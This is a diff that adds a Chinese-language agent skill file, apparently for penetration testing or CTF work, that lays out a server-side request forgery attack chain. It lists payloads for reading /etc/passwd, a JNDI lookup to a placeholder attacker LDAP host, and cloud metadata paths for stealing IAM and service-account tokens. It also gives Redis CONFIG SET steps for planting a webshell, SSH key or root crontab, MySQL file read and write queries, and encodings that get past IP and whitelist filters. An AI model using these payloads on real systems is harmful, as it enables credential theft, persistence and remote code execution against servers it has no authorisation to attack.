@@ -1,0 +1,98 @@
+---
+name: ssrf-attack-chain
+description: Use when encountering ssrf攻击思维链 - 协议利用、内网穿透、云元数据、redis/mysql攻击
+---
+
+# 服务端请求伪造攻击链
+
+## Info
+
+- **Domain**: web
+- **Tags**: web, ssrf
+
+# SSRF攻击思维链
+
+## 攻击思路
+
+```
+1. 协议探测 → file/dict/gopher/ldap
+2. 内网探测 → 常见端口+时间差异判断
+3. 云环境判断 → 169.254.169.254 / metadata.google.internal
+4. 具体攻击 → Redis写Shell/MySQL读文件/FastCGI RCE
+```
+
+---
+
+## 关键协议
+
+| 协议 | 用途 | 示例 |
+|------|------|------|
+| file | 读本地文件 | file:///etc/passwd |
+| dict | 探测服务 | dict://127.0.0.1:6379/info |
+| gopher | 构造任意TCP | gopher://ip:port/_payload |
+| ldap | JNDI注入 | ldap://attacker:1389/Exploit |
+
+**gopher构造**: URL编码 + %0d%0a换行
+
+---
+
+## 云元数据端点
+
+| 平台 | 地址 | 关键路径 |
+|------|------|----------|
+| AWS | 169.254.169.254 | /latest/meta-data/iam/security-credentials/ |
+| GCP | metadata.google.internal | /computeMetadata/v1/instance/service-accounts/default/token |
+| Azure | 169.254.169.254 | /metadata/identity/oauth2/token |
+| 阿里云 | 100.100.100.200 | /latest/meta-data/ram/security-credentials/ |
+
+**注意**: GCP需要 `Metadata-Flavor: Google` 头
+
+---
+
+## Redis攻击链
+
+**核心思路**: 利用CONFIG写文件
+
+```
+1. 写WebShell → dir=/var/www/html, dbfilename=shell.php
+2. 写SSH公钥 → dir=/root/.ssh, dbfilename=authorized_keys
+3. 写Crontab → dir=/var/spool/cron, dbfilename=root
+4. 主从复制RCE → Redis 4.x/5.x加载恶意so
+```
+
+**gopher payload构造**:
+```
+CONFIG SET dir /path
+CONFIG SET dbfilename file
+SET key content
+SAVE
+```
+每行URL编码，用%0d%0a连接
+
+---
+
+## MySQL攻击
+
+**利用条件**: 需要构造MySQL协议包，或使用LOAD_FILE
+
+- `SELECT LOAD_FILE('/etc/passwd')` 读文件
+- `SELECT ... INTO OUTFILE '/path/file'` 写文件
+- gopher构造需要完整MySQL握手包
+
+---
+
+## 绕过技巧
+
+| 场景 | 方法 |
+|------|------|
+| IP过滤 | 0177.0.0.1 / 2130706433 / 0x7f000001 / 127.1 |
+| 域名白名单 | 127.0.0.1.nip.io / localtest.me |
+| 协议过滤 | URL编码 / 重定向 / DNS重绑定 |
+| 端口限制 | 使用常见端口(80,443)做代理 |
+
+---
+
+## 工具
+
+- **Gopherus**: 生成gopher payload (FastCGI/MySQL/Redis)
+- **SSRFmap**: 自动化测试框架
